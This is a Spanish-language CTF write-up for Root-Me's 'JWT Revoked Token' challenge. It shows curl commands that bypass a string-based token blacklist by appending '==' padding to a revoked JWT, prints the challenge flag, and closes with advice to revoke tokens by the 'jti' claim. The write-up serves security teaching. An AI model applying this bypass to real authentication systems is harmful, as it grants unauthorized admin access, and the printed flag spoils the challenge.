---

# Root-Me Write-up: JWT Revoked Token

## 1. Enumeración y Descubrimiento

Al investigar los endpoints del reto, se identificó que el acceso a `/login` mediante `GET` no está permitido (**405 Method Not Allowed**).

```bash
curl -i http://challenge01.root-me.org/web-serveur/ch63/login

```

Al realizar una petición `POST` vacía, el servidor responde con un error **400 Bad Request** detallando el formato esperado:
`{"msg":"Bad request. Submit your login / pass as {\"username\":\"admin\",\"password\":\"admin\"}"}`

## 2. Análisis del Código Fuente y Lógica de Revocación

El código fuente proporcionado revela que el servidor implementa una **Blacklist** (Lista negra) basada en memoria. Inmediatamente después de generar un token en el login, el servidor lo añade a esta lista:

```python
access_token = create_access_token(identity=username, ...)
with lock:
    blacklist.add(access_token)

```

En el endpoint `/admin`, el servidor verifica si el token enviado está en la lista negra mediante una **comparación de igualdad estricta**:

```python
if access_token in blacklist:
    return jsonify({"msg":"Token is revoked"})

```

## 3. Vulnerabilidad: Discrepancia en el Procesamiento de Base64

La vulnerabilidad reside en cómo se maneja el token codificado. La lista negra compara el **string** literal del token. Sin embargo, según el estándar **RFC 4648**, la codificación Base64 permite variaciones en el **padding** (`=`) que no alteran el contenido decodificado.

Para Python:

* `"token"` **es diferente de** `"token=="` (La comparación en la lista negra falla).
* Sin embargo, para la librería JWT, ambos representan el mismo contenido (La autenticación es exitosa).

## 4. Explotación

Primero, obtenemos el token válido:

```bash
curl -X POST http://challenge01.root-me.org/web-serveur/ch63/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"admin"}'

```

Luego, enviamos el token al endpoint `/admin` añadiendo `==` al final de la firma para evadir la comparación de la lista negra:

```bash
curl http://challenge01.root-me.org/web-serveur/ch63/admin \
     -H "Authorization: Bearer [TOKEN_AQUÍ]=="

```

## 5. Resultado y Flag

El servidor no encuentra el string modificado en su lista negra y procede a validar el JWT, permitiendo el acceso.

**Flag:** `Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld`

---

## Lecciones de Seguridad

* **Revocación por JTI:** Nunca se deben revocar tokens comparando el string codificado. Se debe utilizar el claim `jti` (JWT ID) para identificar y revocar tokens de forma única y segura.
* **Tiempo de Expiración:** Aunque el token expire en 3 minutos, la ventana de ataque es inmediata si la lógica de revocación es defectuosa.


